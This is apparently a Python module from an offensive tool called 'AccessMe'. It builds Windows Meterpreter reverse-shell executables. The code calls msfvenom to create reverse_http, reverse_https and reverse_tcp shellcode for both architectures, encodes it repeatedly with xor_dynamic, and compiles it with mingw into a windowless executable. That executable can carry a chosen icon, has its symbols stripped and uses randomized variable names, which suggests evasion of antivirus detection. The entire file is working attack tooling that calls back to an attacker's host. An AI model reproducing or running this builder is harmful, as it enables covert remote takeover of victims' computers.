#Import
from lib import core
import random, string
import subprocess, os



Win_x64_Encoder = "x64/xor_dynamic"

Win_x86_Encoder = "x86/xor_dynamic"

Bad_Chars = '\'\\x00\\x0a\\x0d\''

C_Extension = 'c'



#Checking payload ARCH
def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):

    Gen_Payload = True

    while Gen_Payload:

        if ("x64") in ARCH:
            if ("HTTP") in PROTOCOLE:
                if ("Meterpreter") in TYPE:

                    ITERATION = Random_Encoder_Iteration()

                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_http', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    return SHELLCODE


            elif ("HTTPS") in PROTOCOLE:
                if ("Meterpreter") in TYPE:

                    ITERATION = Random_Encoder_Iteration()

                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_https', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    return SHELLCODE


            elif ("TCP") in PROTOCOLE:
                if ("Meterpreter") in TYPE:

                    ITERATION = Random_Encoder_Iteration()

                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    return SHELLCODE



        elif ("x86") in ARCH:
            if ("HTTP") in PROTOCOLE:
                if ("Meterpreter") in TYPE:

                    ITERATION = Random_Encoder_Iteration()

                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_http', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    return SHELLCODE


            elif ("HTTPS") in PROTOCOLE:
                if ("Meterpreter") in TYPE:

                    ITERATION = Random_Encoder_Iteration()

                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_https', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    return SHELLCODE


            elif ("TCP") in PROTOCOLE:
                if ("Meterpreter") in TYPE:

                    ITERATION = Random_Encoder_Iteration()

                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_tcp', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    return SHELLCODE



#Add icon in executable
def Add_Icon():
    print("""
 |------------------------------------------------------------|
 |In the "icon" folder, put your icon files in it.            |
 |To specify an icon file, write as follows: my_icon_name.ico |
 |Press "ENTER" if you do not have an icon.                   |
 |------------------------------------------------------------|
        \n""")
    ICON = core.core_input()
    return ICON



#Auto-Compilation with ICON or no
def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):

    Compiler = True

    while Compiler:

        if ("64") in ARCH:
            if ("Windows") in PLATFORM:
                if ICON != "":

                    RC = 'id ICON "/root/AccessMe/icon/'
                    RC += ''.join((ICON, '"'))
                    with open('/root/AccessMe/icon/AccessMe.rc', 'w') as f:
                        f.write(RC)

                    WINDRES = ['windres', '/root/AccessMe/icon/AccessMe.rc', '-O', 'coff', '-o', '/root/AccessMe/icon/AccessMe.res']
                    subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '/root/AccessMe/icon/AccessMe.res', '-o', FILENAME,'-mwindows']
                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    RM_SourceFile = ['rm', '/root/AccessMe/source.c']
                    subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    RM_RcFile = ['rm', '/root/AccessMe/icon/AccessMe.rc']
                    subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
                    subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print("Compilation completed !")

                    Compiler = False


                else:

                    EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '-o', FILENAME, '-mwindows']
                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print("Compilation completed !")

                    Compiler = False


        elif ("x86") in ARCH:
            if ("Windows") in PLATFORM:
                if ICON != "":

                    RC = 'id ICON "/root/AccessMe/icon/'
                    RC += ''.join((ICON, '"'))
                    with open('/root/AccessMe/icon/AccessMe.rc', 'w') as f:
                        f.write(RC)

                    WINDRES = ['windres_1', '/root/AccessMe/icon/AccessMe.rc', '-O', 'coff', '-o','/root/AccessMe/icon/AccessMe.res']
                    subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    EXE = ['i686-w64-mingw32-gcc', 'source.c', '/root/AccessMe/icon/AccessMe.res', '-o', FILENAME,'-mwindows']
                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    RM_RcFile = ['rm', '/root/AccessMe/icon/AccessMe.rc']
                    subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
                    subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print("Compilation completed !")

                    Compiler = False


                else:

                    EXE = ['i686-w64-mingw32-gcc', 'source.c', '-o', FILENAME, '-mwindows']
                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    RM_SourceFile = ['rm', '/root/AccessMe/source.c']
                    subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print("Compilation completed !")

                    Compiler = False



#Auto-Strip
def Auto_Executable_Strip(FILENAME, PLATFORM):

    Stripper = True

    while Stripper:

        if ("Windows") in PLATFORM:

            EXE_STRIP = ['strip', '-s', FILENAME]
            subprocess.run(EXE_STRIP, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

            print("Strip completed !\n")

            Stripper = False



#Add LHOST param
def LHOST_Input():
    LHOST = "LHOST="
    LHOST += input("Enter you LHOST : ")
    return  LHOST



#Add LPORT param
def LPORT_Input():
    LPORT = "LPORT="
    LPORT += input("Enter you LPORT : ")
    return LPORT



def FILENAME_Input():
    FILENAME = ""
    FILENAME += input("Enter you FILENAME : ")
    return FILENAME



#Varname creator ^^
def Varname_Creator():
    Varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + "_") for _ in range(random.randint(167,489)))
    return Varname



#Random meterpreter encoder iteration
def Random_Encoder_Iteration():
    iteration = str(random.randint(8,49))
    return iteration



def Unnecessary_Characters(PAYLOAD):
    SHELLCODE = PAYLOAD
    SHELLCODE = SHELLCODE.replace(';', '')
    SHELLCODE = SHELLCODE.replace('unsigned char buf[] =', '')

    return SHELLCODE
